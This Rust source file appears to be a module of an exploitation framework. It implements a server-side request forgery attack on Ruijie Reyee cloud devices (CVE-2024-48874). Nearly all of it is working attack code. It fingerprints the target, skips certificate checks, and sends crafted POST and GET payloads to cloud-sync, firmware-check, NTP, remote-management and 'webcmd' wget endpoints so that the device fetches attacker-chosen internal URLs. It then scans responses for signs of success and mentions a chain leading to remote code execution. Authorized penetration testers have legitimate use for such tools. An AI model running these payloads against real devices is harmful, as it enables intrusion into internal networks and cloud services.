//! Ruijie Reyee Cloud SSRF (CVE-2024-48874)
//!
//! **Vulnerability**: Server-Side Request Forgery in Reyee cloud devices
//! **Affected**: Ruijie Reyee cloud-connected devices
//! **CVSS**: 8.6 (High)
//! **Requirements**: Network access to device web interface
//!
//! ## Attack:
//! Part of "Open Sesame" vulnerability chain discovered by Claroty Team82
//! SSRF allows access to internal services and cloud infrastructure
//! Multiple injection points: cloud sync, firmware check, NTP, remote management
//!
//! FOR AUTHORIZED SECURITY TESTING ONLY

use anyhow::{anyhow, Context, Result};
use colored::Colorize;
use reqwest::Client;
use std::io::Write;
use std::time::Duration;

use crate::utils::prompt_yes_no;

// ============================================================================
// CONSTANTS
// ============================================================================

const DEFAULT_TIMEOUT_SECS: u64 = 15;
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) RuijieExploit/1.0";

// ============================================================================
// CONFIGURATION
// ============================================================================

struct ExploitConfig {
    target_url: String,
    ssrf_target: String,
    timeout_secs: u64,
    verify_ssl: bool,
    follow_redirects: bool,
}

impl ExploitConfig {
    fn get_ssrf_endpoints(&self) -> Vec<(String, serde_json::Value, &'static str)> {
        vec![
            // Cloud sync functionality
            (format!("{}/api/cloud/sync", self.target_url),
             serde_json::json!({"url": self.ssrf_target, "action": "fetch"}),
             "Cloud Sync"),
            // Firmware check
            (format!("{}/api/system/checkUpdate", self.target_url),
             serde_json::json!({"server": self.ssrf_target}),
             "Firmware Check"),
            // NTP sync
            (format!("{}/api/system/ntp", self.target_url),
             serde_json::json!({"server": self.ssrf_target}),
             "NTP Sync"),
            // Remote management
            (format!("{}/cgi-bin/luci/api/remote", self.target_url),
             serde_json::json!({"callback_url": self.ssrf_target}),
             "Remote Management"),
            // Diagnostic/wget
            (format!("{}/goform/webcmd", self.target_url),
             serde_json::json!({"cmd": "wget", "url": self.ssrf_target}),
             "Web Command"),
        ]
    }
    
    fn get_ssrf_get_endpoints(&self) -> Vec<String> {
        let encoded = urlencoding::encode(&self.ssrf_target);
        vec![
            format!("{}/?url={}", self.target_url, encoded),
            format!("{}/proxy?target={}", self.target_url, encoded),
            format!("{}/api/fetch?url={}", self.target_url, encoded),
        ]
    }
    
    fn get_timeout(&self) -> Duration {
        Duration::from_secs(self.timeout_secs)
    }
}

// ============================================================================
// HTTP CLIENT
// ============================================================================

fn build_client(config: &ExploitConfig) -> Result<Client> {
    let redirect_policy = if config.follow_redirects {
        reqwest::redirect::Policy::limited(10)
    } else {
        reqwest::redirect::Policy::none()
    };
    
    Client::builder()
        .danger_accept_invalid_certs(!config.verify_ssl)
        .timeout(config.get_timeout())
        .user_agent(USER_AGENT)
        .redirect(redirect_policy)
        .build()
        .context("Failed to build HTTP client")
}

// ============================================================================
// SSRF DETECTION
// ============================================================================

fn detect_ssrf_signs(text: &str, headers: &reqwest::header::HeaderMap) -> (bool, Vec<&'static str>) {
    let mut signs = Vec::new();
    
    // Response contains external content
    if text.contains("<!DOCTYPE") || text.contains("<html") {
        signs.push("HTML content in response");
    }
    if text.to_lowercase().contains("apache") || text.to_lowercase().contains("nginx") {
        signs.push("Web server signature");
    }
    if text.contains("Server:") {
        signs.push("Server header in body");
    }
    
    // Proxy headers
    if headers.contains_key("x-forwarded-for") {
        signs.push("X-Forwarded-For header");
    }
    if headers.contains_key("via") {
        signs.push("Via header");
    }
    
    // Internal service responses
    if text.contains("127.0.0.1") || text.contains("localhost") {
        signs.push("Localhost reference in response");
    }
    if text.contains("internal") || text.contains("private") {
        signs.push("Internal/private reference");
    }
    
    (!signs.is_empty(), signs)
}

// ============================================================================
// EXPLOIT LOGIC
// ============================================================================

async fn test_post_endpoints(client: &Client, config: &ExploitConfig) -> Result<String> {
    let endpoints = config.get_ssrf_endpoints();
    
    println!("{}", format!("[*] Testing {} POST endpoints...", endpoints.len()).blue());
    
    for (endpoint, payload, name) in &endpoints {
        println!("{}", format!("[*] Testing: {} ({})", name, endpoint).dimmed());
        
        let resp = match client.post(endpoint).json(payload).send().await {
            Ok(r) => r,
            Err(e) => {
                println!("{}", format!("[*] Failed: {}", e).dimmed());
                continue;
            }
        };
        
        let status = resp.status();
        let headers = resp.headers().clone();
        let text = match resp.text().await {
            Ok(t) => t,
            Err(e) => {
                println!("{}", format!("[*] Failed to read response: {}", e).dimmed());
                continue;
            }
        };
        
        let (ssrf_detected, signs) = detect_ssrf_signs(&text, &headers);
        
        if ssrf_detected {
            println!("{}", format!("[+] SSRF DETECTED via {}!", name).green().bold());
            println!("{}", "[VULN] Device is VULNERABLE to CVE-2024-48874".red().bold());
            for sign in &signs {
                println!("{}", format!("    • {}", sign).green());
            }
            println!("{}", format!("[*] Response preview:\n{}", &text[..text.len().min(500)]).cyan());
            return Ok(text);
        }
        
        // Substantive response may indicate SSRF
        if status.is_success() && text.len() > 100 {
            println!("{}", format!("[+] Got substantive response ({} bytes)", text.len()).yellow());
        }
        
        if status.is_success() {
            println!("{}", format!("[*] HTTP {} - Endpoint accessible", status).yellow());
        }
    }
    
    Err(anyhow!("SSRF not confirmed via POST endpoints"))
}

async fn test_get_endpoints(client: &Client, config: &ExploitConfig) -> Result<String> {
    let endpoints = config.get_ssrf_get_endpoints();
    
    println!("{}", format!("[*] Testing {} GET endpoints...", endpoints.len()).blue());
    
    for endpoint in &endpoints {
        println!("{}", format!("[*] Testing: {}", &endpoint[..endpoint.len().min(60)]).dimmed());
        
        let resp = match client.get(endpoint).send().await {
            Ok(r) => r,
            Err(_) => continue,
        };
        
        let headers = resp.headers().clone();
        let text = match resp.text().await {
            Ok(t) => t,
            Err(_) => continue,
        };
        
        if text.len() > 100 && !text.contains("error") && !text.contains("404") {
            let (ssrf_detected, signs) = detect_ssrf_signs(&text, &headers);
            
            if ssrf_detected || text.len() > 500 {
                println!("{}", "[+] Possible SSRF via GET endpoint!".yellow());
                for sign in &signs {
                    println!("{}", format!("    • {}", sign).green());
                }
                return Ok(text);
            }
        }
    }
    
    Err(anyhow!("SSRF not confirmed via GET endpoints"))
}

/// Fingerprint the target
async fn check_fingerprint(client: &Client, config: &ExploitConfig) -> bool {
    println!("{}", "[*] Fingerprinting target...".blue());
    
    let resp = match client.get(&config.target_url).send().await {
        Ok(r) => r,
        Err(_) => return false,
    };
    
    let body = match resp.text().await {
        Ok(t) => t,
        Err(_) => return false,
    };
    let body_lower = body.to_lowercase();
    
    let is_reyee = body_lower.contains("ruijie") 
        || body_lower.contains("reyee")
        || body_lower.contains("cloud");
    
    if is_reyee {
        println!("{}", "[+] Target appears to be Ruijie Reyee device".green());
    } else {
        println!("{}", "[*] Could not confirm Reyee device".yellow());
    }
    
    is_reyee
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Gather configuration
    let config = gather_config(target)?;
    
    // Build client
    let client = build_client(&config)?;
    
    // Display config
    println!("\n{}", "=== Starting SSRF Test ===".bold());
    println!("{}", format!("[*] Target URL: {}", config.target_url).cyan());
    println!("{}", format!("[*] SSRF Target: {}", config.ssrf_target).cyan());
    println!("{}", format!("[*] Timeout: {}s", config.timeout_secs).cyan());
    println!("{}", format!("[*] SSL Verify: {}", if config.verify_ssl { "yes" } else { "no" }).cyan());
    println!("{}", format!("[*] Follow Redirects: {}", if config.follow_redirects { "yes" } else { "no" }).cyan());
    
    // Fingerprint
    check_fingerprint(&client, &config).await;
    
    // Test POST endpoints first
    match test_post_endpoints(&client, &config).await {
        Ok(output) => {
            println!("\n{}", "=== SSRF Confirmed ===".green().bold());
            println!("{}", format!("Response length: {} bytes", output.len()).cyan());
            return Ok(());
        }
        Err(_) => {
            println!("{}", "[*] POST endpoints did not confirm SSRF".yellow());
        }
    }
    
    // Try GET endpoints
    match test_get_endpoints(&client, &config).await {
        Ok(output) => {
            println!("\n{}", "=== SSRF Possible ===".yellow().bold());
            println!("{}", format!("Response length: {} bytes", output.len()).cyan());
        }
        Err(_) => {
            println!("\n{}", "[-] SSRF not confirmed through standard endpoints.".red());
            println!("{}", "[*] Consider using out-of-band detection (OAST/callback).".cyan());
            println!("{}", "[*] Part of 'Open Sesame' chain - full chain needed for RCE.".cyan());
        }
    }
    
    Ok(())
}

fn display_banner() {
    println!("{}", r#"
╔═══════════════════════════════════════════════════════════════╗
║   Ruijie Reyee Cloud SSRF (CVE-2024-48874)                    ║
║   Part of 'Open Sesame' Vulnerability Chain                  ║
║   CVSS: 8.6 High | Network Access Required                   ║
╚═══════════════════════════════════════════════════════════════╝
"#.cyan().bold());
    
    println!("{}", "[!] FOR AUTHORIZED SECURITY TESTING ONLY\n".yellow().bold());
}

fn gather_config(initial_target: &str) -> Result<ExploitConfig> {
    // Get target URL
    let target_url = if initial_target.starts_with("http") {
        initial_target.trim_end_matches('/').to_string()
    } else if !initial_target.is_empty() {
        format!("http://{}", initial_target.trim_end_matches('/'))
    } else {
        print!("{}", "Target IP/URL: ".green());
        std::io::stdout().flush()?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;
        let input = input.trim();
        if input.is_empty() {
            return Err(anyhow!("Target is required"));
        }
        if input.starts_with("http") {
            input.trim_end_matches('/').to_string()
        } else {
            format!("http://{}", input.trim_end_matches('/'))
        }
    };
    
    // SSRF target URL
    print!("{}", "SSRF target URL [http://127.0.0.1:80/]: ".green());
    std::io::stdout().flush()?;
    let mut ssrf_target = String::new();
    std::io::stdin().read_line(&mut ssrf_target)?;
    let ssrf_target = ssrf_target.trim();
    let ssrf_target = if ssrf_target.is_empty() { 
        "http://127.0.0.1:80/".to_string() 
    } else { 
        ssrf_target.to_string() 
    };
    
    // Follow redirects
    let follow_redirects = prompt_yes_no("Follow HTTP redirects?", false)?;
    
    // Timeout
    print!("{}", format!("Timeout seconds [{}]: ", DEFAULT_TIMEOUT_SECS).green());
    std::io::stdout().flush()?;
    let mut timeout_input = String::new();
    std::io::stdin().read_line(&mut timeout_input)?;
    let timeout_secs = timeout_input.trim().parse().unwrap_or(DEFAULT_TIMEOUT_SECS);
    
    // SSL verification
    let verify_ssl = !prompt_yes_no("Skip SSL verification?", true)?;
    
    let config = ExploitConfig {
        target_url,
        ssrf_target,
        timeout_secs,
        verify_ssl,
        follow_redirects,
    };
    
    // Show config summary
    println!("\n{}", "=== Configuration ===".bold());
    println!("  Target:      {}", config.target_url);
    println!("  SSRF Target: {}", config.ssrf_target);
    println!("  Redirects:   {}", if config.follow_redirects { "follow" } else { "block" });
    println!("  Timeout:     {}s", config.timeout_secs);
    println!("  SSL:         {}", if config.verify_ssl { "verified" } else { "skip" });
    
    if !prompt_yes_no("\nProceed with SSRF test?", true)? {
        return Err(anyhow!("Cancelled by user"));
    }
    
    Ok(config)
}
